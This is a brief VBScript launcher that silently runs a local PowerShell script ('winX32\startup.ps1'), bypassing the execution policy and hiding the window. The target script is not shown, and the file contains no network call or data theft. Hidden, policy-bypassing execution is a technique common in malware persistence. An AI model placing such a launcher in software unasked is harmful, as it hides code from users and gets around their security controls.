Set objShell = CreateObject("WScript.Shell")

' Run the PowerShell script silently
objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File ""C:\Program Files (x86)\winX32\startup.ps1""", 0, True
